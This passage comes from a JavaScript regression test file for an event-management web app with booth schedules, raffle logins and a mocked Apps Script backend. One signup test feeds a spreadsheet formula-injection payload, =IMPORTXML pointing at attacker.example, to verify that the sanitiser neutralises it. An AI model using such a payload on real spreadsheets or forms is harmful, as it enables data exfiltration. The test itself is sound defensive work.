  vm.runInContext(`${boothsConfigSource}\nthis.__booths = CONNECTOR_BOOTHS; this.__wristbandColors = WRISTBAND_COLORS; this.__routes = WRISTBAND_ROUTES; this.__sessions = BOOTH_SESSIONS;`, boothsConfigContext);
  const boothConfigs = Array.from(boothsConfigContext.__booths, (booth) => ({ ...booth }));
  const eventScheduleSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "event-schedule.js"), "utf8");
  vm.runInContext(`${eventScheduleSource}\nthis.__eventSchedule = EventSchedule;`, boothsConfigContext);
  const eventSchedule = boothsConfigContext.__eventSchedule;
  assert.match(dashboardSource, /if \(!OrganizerAuth\.isCurrent\(authGeneration\)\) return false/);
  assert.match(dashboardSource, /groupSignupsByOption\(data\.signups\)/);
  assert.match(dashboardSource, /Phone\.formatDisplay\(s\.phone\)/);
  assert.match(dashboardSource, /EventAPI\.dashboardData\(/);
  assert.doesNotMatch(dashboardSource, /id="signup-table"/);
  assert.match(artKioskSource, /OrganizerAuth\.isCurrent\(authGeneration\)/);
  assert.match(songKioskSource, /let isSaving = false/);
  assert.match(songKioskSource, /if \(isSaving \|\| !currentVisitor\) return/);
  assert.match(phase1Source, /Phase 1 complete/);
  assert.match(phase1Source, /Thank you/);
  assert.match(phase1Source, /name="wristband-color"/);
  assert.match(phase1Source, /EventAPI\.confirmWristband\(identity\.attendeeId, selectedWristbandColor\)/);
  assert.match(phase1Source, /href="\.\.\/phase2-booths\/hub\.html"/);
  assert.match(phase1Source, /Open my booth schedule/i);
  assert.match(phase2Source, /shared\/attendee-portal\.js/);
  assert.match(phase2Source, /shared\/event-schedule\.js/);
  assert.match(phase2Source, /AttendeePortal\.signIn\(PORTAL/);
  assert.match(phase2Source, /AttendeePortal\.continueAs\(PORTAL\)/);
  assert.match(phase2Source, /EventSchedule\.currentBooth/);
  assert.match(phase2Source, /EventAPI\.boothPresentation/);
  assert.match(phase2Source, /id="attendee-name"/);
  assert.match(phase2Source, /id="attendee-raffle"/);
  assert.match(phase2Source, /id="session-countdown"/);
  assert.doesNotMatch(phase2Source, /window\.location\.href = "\.\.\/phase3-signup\/index\.html"/);
  assert.match(boothRoomSource, /const portal = `phase2\.\$\{boothId\}`/);
  assert.match(boothRoomSource, /AttendeePortal\.signIn\(portal/);
  assert.match(boothRoomSource, /id="booth-login-name"[^>]*autocomplete="off"/);
  assert.match(boothRoomSource, /id="booth-login-raffle"[^>]*autocomplete="off"/);
  assert.doesNotMatch(boothCommonSource, /hub\.html/);
  assert.match(boothCommonSource, /completeBoothRoom/);
  assert.match(boothCommonSource, /const identity = _boothIdentity \|\| Identity\.peek\(\)/);
  assert.match(phase3Source, /AttendeePortal\.signIn\("phase3"/);
  assert.match(phase3Source, /AttendeePortal\.continueAs\("phase3"\)/);
  assert.doesNotMatch(phase3Source, /AttendeePortal\.prefill/);
  assert.match(phase3Source, /id="phase3-name"[^>]*autocomplete="name"/);
  assert.match(phase3Source, /role="checkbox"/);
  assert.match(phase3Source, /Tick and go/i);
  assert.match(phase3Source, /EventAPI\.saveSignupSelections/);
  assert.match(phase3Source, /EventAPI\.mySignupSelections/);
  assert.doesNotMatch(phase3Source, /id="detail-email"|id="detail-comment"|class="star-row"/);
  assert.match(doneSource, /AttendeePortal\.restore\("phase3"\)/);

  assert.equal(boothConfigs.length, 5);
  assert.equal(new Set(boothConfigs.map((booth) => booth.page)).size, 5);
  assert.equal(new Set(boothConfigs.map((booth) => booth.staffPage)).size, 5);

  const expectedRoutes = {
    blue: ["heaven", "trivia", "story"],
    red: ["trivia", "heaven", "art"],
    orange: ["art", "story", "newsong"],
    green: ["newsong", "art", "heaven"],
    yellow: ["story", "newsong", "trivia"],
  };
  assert.deepEqual(
    Array.from(boothsConfigContext.__wristbandColors, (color) => color.id),
    ["blue", "red", "orange", "green", "yellow"]
  );
  Object.entries(expectedRoutes).forEach(([color, expectedRoute]) => {
    assert.deepEqual(Array.from(eventSchedule.route(color)), expectedRoute, `${color} wristband route`);
  });
  const allBoothIds = boothConfigs.map((booth) => booth.id).sort();
  [0, 1, 2].forEach((sessionIndex) => {
    const assignedBooths = Object.values(expectedRoutes).map((route) => route[sessionIndex]);
    assert.equal(new Set(assignedBooths).size, 5, `session ${sessionIndex + 1} should assign each booth once`);
    assert.deepEqual(assignedBooths.slice().sort(), allBoothIds);
  });

  const atSession1 = eventSchedule.stateAt(Date.parse("2026-07-18T15:10:00-05:00"));
  assert.equal(atSession1.phase, "active");
  assert.equal(atSession1.sessionIndex, 0);
  assert.equal(atSession1.session.number, 1);
  assert.equal(atSession1.remainingMs, 20 * 60 * 1000);
  const atSession2 = eventSchedule.stateAt(Date.parse("2026-07-18T15:30:00-05:00"));
  assert.equal(atSession2.phase, "active");
  assert.equal(atSession2.sessionIndex, 1);
  assert.equal(atSession2.session.number, 2);
  const atSession3 = eventSchedule.stateAt(Date.parse("2026-07-18T15:50:00-05:00"));
  assert.equal(atSession3.phase, "active");
  assert.equal(atSession3.sessionIndex, 2);
  assert.equal(atSession3.session.number, 3);
  const atExperienceEnd = eventSchedule.stateAt(Date.parse("2026-07-18T16:10:00-05:00"));
  assert.equal(atExperienceEnd.phase, "ended");
  assert.equal(atExperienceEnd.sessionIndex, null);
  assert.equal(atExperienceEnd.remainingMs, 0);
  assert.equal(eventSchedule.currentBooth("blue", atSession1).id, "heaven");
  assert.equal(eventSchedule.currentBooth("blue", atSession2).id, "trivia");
  assert.equal(eventSchedule.currentBooth("blue", atSession3).id, "story");
  assert.equal(eventSchedule.currentBooth("blue", atExperienceEnd), null);
  assert.equal(eventSchedule.formatCountdown(20 * 60 * 1000), "20:00");

  [dashboardSource, artKioskSource, songKioskSource].forEach((source) => {
    assert.match(source, /shared\/phone\.js/);
  });
  const attendeeRooms = {
    "booth-heaven.html": "heaven",
    "booth-trivia.html": "trivia",
    "booth-story.html": "story",
    "booth-art.html": "art",
    "booth-newsong.html": "newsong",
  };
  Object.entries(attendeeRooms).forEach(([filename, boothId]) => {
    const source = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-booths", filename), "utf8");
    assert.match(source, /shared\/phone\.js/);
    assert.match(source, /shared\/attendee-portal\.js/);
    assert.match(source, /shared\/booth-room\.js/);
    assert.match(source, /maxlength="14"/);
    assert.match(source, new RegExp(`const BOOTH_ID = "${boothId}"`));
    assert.match(source, /initBoothRoom\(/);
    assert.doesNotMatch(source, /href="hub\.html"|Back to Gym/);
  });

  const boothStaffCommon = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "booth-staff-common.js"), "utf8");
  assert.match(boothStaffCommon, /EventAPI\.boothDashboardData/);
  assert.match(boothStaffCommon, /EventAPI\.updateBoothPresentation/);
  assert.match(boothStaffCommon, /EventSchedule\.groupForBooth/);
  assert.doesNotMatch(boothStaffCommon, /EventAPI\.dashboardData\(/);
  ["heaven", "trivia", "story", "art", "newsong"].forEach((boothId) => {
    const source = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-staff", `${boothId}.html`), "utf8");
    assert.match(source, new RegExp(`initBoothStaff\\("${boothId}"\\)`));
    assert.match(source, /id="staff-settings"/);
  });

  const gasSource = fs.readFileSync(path.join(__dirname, "..", "..", "apps-script", "Code.gs"), "utf8");
  assert.equal((gasSource.match(/LockService\.getScriptLock\(\)/g) || []).length, 1);
  assert.match(gasSource, /nextRaffleNumber\(lock\)/);
  assert.doesNotMatch(gasSource, /function nextRaffleNumber\(\)/);
}

function runAppsScriptRegression() {
  class MockSheet {
    constructor() { this.rows = []; }
    appendRow(values) { this.rows.push(values.slice()); }
    setFrozenRows() {}
    getDataRange() {
      return { getValues: () => this.rows.map((row) => row.slice()) };
    }
    getRange(row, column) {
      return { setValue: (value) => { this.rows[row - 1][column - 1] = value; } };
    }
    deleteRow(row) { this.rows.splice(row - 1, 1); }
  }

  class MockSpreadsheet {
    constructor() { this.sheets = new Map(); }
    getSheetByName(name) { return this.sheets.get(name) || null; }
    insertSheet(name) {
      const sheet = new MockSheet();
      this.sheets.set(name, sheet);
      return sheet;
    }
  }

  const spreadsheet = new MockSpreadsheet();
  const lockState = { held: false, acquisitions: 0, releases: 0 };
  let flushShouldThrow = false;
  let uuidCounter = 0;
  const gasContext = {
    SpreadsheetApp: {
      getActiveSpreadsheet: () => spreadsheet,
      flush: () => {
        if (flushShouldThrow) throw new Error("flush failed");
      },
    },
    LockService: {
      getScriptLock: () => {
        let acquired = false;
        return {
          waitLock: () => {
            if (lockState.held) throw new Error("nested lock acquisition");
            lockState.held = true;
            lockState.acquisitions += 1;
            acquired = true;
          },
          hasLock: () => acquired && lockState.held,
          releaseLock: () => {
            if (acquired) {
              lockState.held = false;
              lockState.releases += 1;
              acquired = false;
            }
          },
        };
      },
    },
    PropertiesService: {
      getScriptProperties: () => ({ getProperty: (key) => key === "ORGANIZER_KEY" ? "gas-organizer-key" : null }),
    },
    Utilities: { getUuid: () => `gas-id-${++uuidCounter}` },
    ContentService: {
      MimeType: { JSON: "json" },
      createTextOutput: (content) => ({
        content,
        mimeType: null,
        setMimeType(mimeType) { this.mimeType = mimeType; return this; },
      }),
    },
  };
  vm.createContext(gasContext);
  const gasSource = fs.readFileSync(path.join(__dirname, "..", "..", "apps-script", "Code.gs"), "utf8");
  vm.runInContext(`${gasSource}\nthis.__gas = {
    actionRegisterAttendee,
    actionConfirmWristband,
    actionLoginAttendee,
    actionAttendeePortalSession,
    actionFindOrRegisterByPhone,
    actionBoothCheckin,
    actionSubmitSignup,
    actionSaveSignupSelections,
    actionConfirmSignupInPerson,
    actionDashboardData,
    actionBoothPresentation,
    actionUpdateBoothPresentation,
    actionBoothDashboardData,
    actionMyCheckins,
    actionMySignupSelections,
    sheetSafeValue,
    nextRaffleNumber,
    withScriptLock,
    doPost
  };`, gasContext);
  const gas = gasContext.__gas;

  let result = gas.actionRegisterAttendee({ attendeeId: "gas-entry-a", name: "Avery" });
  assert.equal(result.raffleNumber, "1001");
  assert.equal(result.isNew, true);
  assert.equal(lockState.acquisitions, 1);
  assert.equal(lockState.releases, 1);
  result = gas.actionRegisterAttendee({ attendeeId: "gas-entry-a", name: "Avery" });
  assert.equal(result.isNew, false);

  assert.throws(
    () => gas.actionLoginAttendee({ name: " aVeRy ", raffleNumber: "#1001", portal: "phase2" }),
    (error) => error.code === "PHASE1_INCOMPLETE"
  );
  result = gas.actionLoginAttendee({ name: " aVeRy ", raffleNumber: "#1001", portal: "phase3" });
  assert.equal(result.attendeeId, "gas-entry-a");
  assert.equal(result.wristbandColor, null);
  assert.equal(result.phoneLinked, false);
  assertIsoTimestamp(result.serverNow, "Apps Script attendee serverNow");
  assert.equal("phone" in result, false);
  assert.throws(
    () => gas.actionLoginAttendee({ name: "Wrong", raffleNumber: "1001", portal: "phase3" }),
    (error) => error.code === "ATTENDEE_LOGIN_FAILED"
  );

  const beforeUnauthorized = lockState.acquisitions;
  assert.throws(
    () => gas.actionFindOrRegisterByPhone({ phone: "6155550909", allowCreate: true, organizerKey: "wrong" }),
    (error) => error.code === "AUTH_REQUIRED"
  );
  assert.equal(lockState.acquisitions, beforeUnauthorized);

  for (const invalidPhone of ["615555010", "16155550101"]) {
    const beforeInvalidPhone = lockState.acquisitions;
    assert.throws(
      () => gas.actionFindOrRegisterByPhone({
        phone: invalidPhone,
        allowCreate: true,
        organizerKey: "gas-organizer-key",
      }),
      (error) => error.code === "INVALID_PHONE"
    );
    assert.equal(lockState.acquisitions, beforeInvalidPhone);
  }

  result = gas.actionFindOrRegisterByPhone({
    phone: "6155550101",
    raffleNumber: "1001",
    organizerKey: "gas-organizer-key",
  });
  assert.equal(result.requiresPairingConfirmation, true);
  const gasAttendeeSheet = spreadsheet.getSheetByName("Attendees");
  const gasPhoneColumn = gasAttendeeSheet.rows[0].indexOf("phone");
  assert.equal(gasAttendeeSheet.rows[1][gasPhoneColumn], "");
  result = gas.actionFindOrRegisterByPhone({
    phone: "6155550101",
    raffleNumber: "1001",
    confirmPairing: true,
    organizerKey: "gas-organizer-key",
  });
  assert.equal(result.attendeeId, "gas-entry-a");
  assert.equal(result.raffleNumber, "1001");

  const beforeAttendeeDependentWrites = lockState.acquisitions;
  assert.throws(
    () => gas.actionConfirmWristband({ attendeeId: "gas-entry-a" }),
    (error) => error.code === "INVALID_WRISTBAND_COLOR"
  );
  assert.throws(
    () => gas.actionConfirmWristband({ attendeeId: "gas-entry-a", wristbandColor: "purple" }),
    (error) => error.code === "INVALID_WRISTBAND_COLOR"
  );
  assert.equal(lockState.acquisitions, beforeAttendeeDependentWrites);
  result = gas.actionConfirmWristband({ attendeeId: "gas-entry-a", wristbandColor: " BLUE " });
  assert.equal(result.wristbandColor, "blue");
  const gasSignup = gas.actionSubmitSignup({
    attendeeId: "gas-entry-a",
    phone: "6155550101",
    optionId: "formula-test",
    optionTitle: "=IMPORTXML(\"https://attacker.example\")",
  });
  gas.actionConfirmSignupInPerson({
    signupId: gasSignup.signupId,
    confirmedBy: "staff",
    organizerKey: "gas-organizer-key",
  });
  assert.equal(lockState.acquisitions, beforeAttendeeDependentWrites + 3);
  result = gas.actionLoginAttendee({ name: "Avery", raffleNumber: "1001", portal: "phase2" });
  assert.equal(result.wristbandConfirmed, true);
  assert.equal(result.wristbandColor, "blue");
  assertIsoTimestamp(result.serverNow, "Apps Script Phase 2 login serverNow");
  result = gas.actionAttendeePortalSession({ attendeeId: "gas-entry-a", portal: "phase2" });
  assert.equal(result.attendeeId, "gas-entry-a");
  assert.equal(result.wristbandColor, "blue");
  assertIsoTimestamp(result.serverNow, "Apps Script restored session serverNow");

  const duplicateGasSignup = gas.actionSubmitSignup({
    attendeeId: "gas-entry-a",
    phone: "(615) 555-0101",
    optionId: "formula-test",
    optionTitle: "=IMPORTXML(\"https://attacker.example\")",
  });
  assert.equal(duplicateGasSignup.signupId, gasSignup.signupId);
  assert.equal(duplicateGasSignup.updated, true);
  result = gas.actionSaveSignupSelections({
    attendeeId: "gas-entry-a",
    optionIds: ["future", "art", "future"],
  });
  assert.deepEqual(Array.from(result.optionIds), ["future", "art"]);
  const gasArtSignupId = result.signupIds[1];
  result = gas.actionMySignupSelections({ attendeeId: "gas-entry-a" });
  assert.deepEqual(Array.from(result.optionIds), ["future", "art"]);
  result = gas.actionSaveSignupSelections({ attendeeId: "gas-entry-a", optionIds: ["art"] });
  assert.deepEqual(Array.from(result.optionIds), ["art"]);
  assert.equal(result.signupIds[0], gasArtSignupId);
  result = gas.actionSaveSignupSelections({ attendeeId: "gas-entry-a", optionIds: [] });
  assert.deepEqual(Array.from(result.optionIds), []);
  assert.deepEqual(Array.from(gas.actionMySignupSelections({ attendeeId: "gas-entry-a" }).optionIds), []);
  assert.throws(
    () => gas.actionSaveSignupSelections({ attendeeId: "gas-entry-a", optionIds: ["invalid"] }),
    (error) => error.code === "INVALID_SIGNUP_OPTIONS"
  );
  assert.equal(gas.sheetSafeValue("=SUM(1,2)"), "'=SUM(1,2)");
  assert.equal(gas.sheetSafeValue("  =SUM(1,2)"), "'  =SUM(1,2)");
  assert.equal(gas.sheetSafeValue("\t=SUM(1,2)"), "'\t=SUM(1,2)");
  assert.equal(gas.sheetSafeValue("\r@SUM(1,2)"), "'\r@SUM(1,2)");
  const signupSheet = spreadsheet.getSheetByName("SignUps");
  const optionTitleColumn = signupSheet.rows[0].indexOf("optionTitle");
  assert.match(signupSheet.rows[1][optionTitleColumn], /^'/);

  result = gas.actionFindOrRegisterByPhone({
    phone: "6155550202",
    allowCreate: true,
    organizerKey: "gas-organizer-key",
  });
  const kioskId = result.attendeeId;
  assert.equal(result.raffleNumber, "1002");
  gas.actionBoothCheckin({
    attendeeId: kioskId,
    phone: "6155550202",
    boothId: "newsong",
    checkedInBy: "staff-kiosk",
    organizerKey: "gas-organizer-key",
  });

  result = gas.actionRegisterAttendee({ attendeeId: "gas-entry-c", name: "Casey" });
  assert.equal(result.raffleNumber, "1003");
  result = gas.actionFindOrRegisterByPhone({
    phone: "6155550202",
    raffleNumber: "1003",
    organizerKey: "gas-organizer-key",
  });
  assert.equal(result.requiresPairingConfirmation, true);
  assert.equal(spreadsheet.getSheetByName("Attendees").rows.length, 4);
  result = gas.actionFindOrRegisterByPhone({
    phone: "6155550202",
    raffleNumber: "1003",
    confirmPairing: true,
    organizerKey: "gas-organizer-key",
  });
  assert.equal(result.attendeeId, "gas-entry-c");
  assert.equal(result.raffleNumber, "1003");

  const attendeeSheet = spreadsheet.getSheetByName("Attendees");
  assert.equal(attendeeSheet.rows.length, 3); // header + Avery + Casey
  const checkinSheet = spreadsheet.getSheetByName("BoothCheckins");
  const checkinHeaders = checkinSheet.rows[0];
  const attendeeIdColumn = checkinHeaders.indexOf("attendeeId");
  assert.equal(checkinSheet.rows[1][attendeeIdColumn], "gas-entry-c");
  const originalNewsongCheckinId = checkinSheet.rows[1][checkinHeaders.indexOf("id")];
  result = gas.actionBoothCheckin({
    attendeeId: "gas-entry-c",
    phone: "6155550202",
    boothId: "newsong",
    boothName: "The New Song in Nashville",
    checkedInBy: "self",
    rating: 5,
  });
  assert.equal(result.checkinId, originalNewsongCheckinId);
  assert.equal(result.updated, true);
  assert.equal(checkinSheet.rows.length, 2);
  assert.equal(checkinSheet.rows[1][checkinHeaders.indexOf("rating")], 5);
  result = gas.actionMyCheckins({ attendeeId: kioskId });
  assert.deepEqual(Array.from(result.boothIds), ["newsong"]);

  result = gas.actionBoothPresentation({ boothId: "art" });
  assert.equal(result.boothId, "art");
  assert.equal(result.stepIndex, 0);
  assert.equal(result.status, "waiting");
  assert.equal(result.message, "");
  assert.equal(result.version, 0);
  assertIsoTimestamp(result.serverNow, "Apps Script booth serverNow");
  assert.throws(
    () => gas.actionBoothPresentation({ boothId: "unknown" }),
    (error) => error.code === "BOOTH_NOT_FOUND"
  );

  const beforePresentationWrites = lockState.acquisitions;
  assert.throws(
    () => gas.actionUpdateBoothPresentation({
      boothId: "art", stepIndex: 1, status: "live", message: "Begin", organizerKey: "wrong",
    }),
    (error) => error.code === "AUTH_REQUIRED"
  );
  assert.throws(
    () => gas.actionUpdateBoothPresentation({
      boothId: "art", stepIndex: 1, status: "invalid", message: "Begin", organizerKey: "gas-organizer-key",
    }),
    (error) => error.code === "INVALID_PRESENTATION_STATUS"
  );
  assert.equal(lockState.acquisitions, beforePresentationWrites);
  result = gas.actionUpdateBoothPresentation({
    boothId: "art",
    stepIndex: 2,
    status: "live",
    message: "  Start drawing now.  ",
    organizerKey: "gas-organizer-key",
  });
  assert.equal(result.version, 1);
  assert.equal(result.message, "Start drawing now.");
  assert.equal(result.status, "live");
  assertIsoTimestamp(result.createdAt, "Apps Script presentation createdAt");
  const gasPresentationCreatedAt = result.createdAt;
  assert.throws(
    () => gas.actionUpdateBoothPresentation({
      boothId: "art",
      stepIndex: 4,
      status: "wrap",
      message: "Stale",
      version: 0,
      organizerKey: "gas-organizer-key",
    }),
    (error) => error.code === "PRESENTATION_CONFLICT"
  );
  result = gas.actionUpdateBoothPresentation({
    boothId: "art",
    stepIndex: 3,
    status: "wrap",
    message: "Finish your last detail.",
    version: 1,
    organizerKey: "gas-organizer-key",
  });
  assert.equal(result.version, 2);
  assert.equal(result.createdAt, gasPresentationCreatedAt);
  assert.equal(result.status, "wrap");
  result = gas.actionBoothPresentation({ boothId: "heaven" });
  assert.equal(result.version, 0);
  assert.equal(result.status, "waiting");

  const beforeUnauthorizedBooth = lockState.acquisitions;
  assert.throws(
    () => gas.actionBoothDashboardData({ boothId: "newsong", organizerKey: "wrong" }),
    (error) => error.code === "AUTH_REQUIRED"
  );
  assert.equal(lockState.acquisitions, beforeUnauthorizedBooth);
  assert.throws(
    () => gas.actionBoothDashboardData({ boothId: "unknown", organizerKey: "gas-organizer-key" }),
    (error) => error.code === "BOOTH_NOT_FOUND"
  );
  assert.equal(lockState.acquisitions, beforeUnauthorizedBooth);
  result = gas.actionBoothDashboardData({ boothId: "newsong", organizerKey: "gas-organizer-key" });
  assert.equal(result.totalCheckins, 1);
  assert.deepEqual(Array.from(result.recentCheckins, (checkin) => checkin.name), ["Casey"]);
  assert.equal("phone" in result.recentCheckins[0], false);
  assert.equal("signups" in result, false);
  assert.equal(result.presentation.boothId, "newsong");
  assert.equal(result.presentation.version, 0);
  assertIsoTimestamp(result.serverNow, "Apps Script booth dashboard serverNow");
  result = gas.actionBoothDashboardData({ boothId: "art", organizerKey: "gas-organizer-key" });
  assert.equal(result.presentation.stepIndex, 3);
  assert.equal(result.presentation.status, "wrap");
  assert.equal(result.presentation.version, 2);

  assert.throws(
    () => gas.actionDashboardData({ organizerKey: "wrong" }),
    (error) => error.code === "AUTH_REQUIRED"
  );
  const gasDashboard = gas.actionDashboardData({ organizerKey: "gas-organizer-key" });
  assert.equal(gasDashboard.totals.registered, 2);
  assert.equal(gasDashboard.signups[0].optionId, "formula-test");
  assert.throws(
    () => gas.nextRaffleNumber(null),
    (error) => error.code === "LOCK_REQUIRED"
  );
  assert.throws(
    () => gas.actionFindOrRegisterByPhone({ attendeeId: "missing-public-id", phone: "6155550999" }),
    (error) => error.code === "ATTENDEE_NOT_FOUND"
  );
  assert.throws(
    () => gas.actionMyCheckins({ attendeeId: "missing-public-id" }),
    (error) => error.code === "ATTENDEE_NOT_FOUND"
  );
  assert.throws(
    () => gas.actionMySignupSelections({ attendeeId: "missing-public-id" }),
    (error) => error.code === "ATTENDEE_NOT_FOUND"
  );

  function post(action, payload) {
    const output = gas.doPost({ pathInfo: action, postData: { contents: JSON.stringify(payload || {}) } });
    assert.equal(output.mimeType, "json");
    return JSON.parse(output.content);
  }
  assert.equal(post("registerAttendee", { attendeeId: "gas-http-entry", name: "HTTP" }).raffleNumber, "1004");
  assert.equal(post("loginAttendee", { name: "HTTP", raffleNumber: "1004", portal: "phase3" }).attendeeId, "gas-http-entry");
  assert.equal(post("dashboardData", { organizerKey: "wrong" }).code, "AUTH_REQUIRED");
  assert.equal(post("myCheckins", {}).code, "ATTENDEE_ID_REQUIRED");
  assert.equal(post("mySignupSelections", {}).code, "ATTENDEE_ID_REQUIRED");
  assert.equal(post("doesNotExist", {}).code, "UNKNOWN_ACTION");

  assert.throws(
    () => gas.withScriptLock(() => { throw new Error("callback failed"); }),
    /callback failed/
  );
  assert.equal(lockState.held, false);
  flushShouldThrow = true;
  assert.throws(() => gas.withScriptLock(() => "ok"), /flush failed/);
  assert.equal(lockState.held, false);
  flushShouldThrow = false;
  assert.equal(lockState.acquisitions, lockState.releases);
}

async function main() {
  try {
    runInlineScriptSyntaxRegression();
    startServer(0);
    await once(server, "listening");
    const port = server.address().port;
    await runApiRegression(port);
    await runFrontendContractRegression();
    runAppsScriptRegression();
    console.log("All event app regression tests passed.");
  } finally {
    if (server.listening) {
      server.close();
      await once(server, "close");
    }
    fs.rmSync(testDb, { force: true });
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
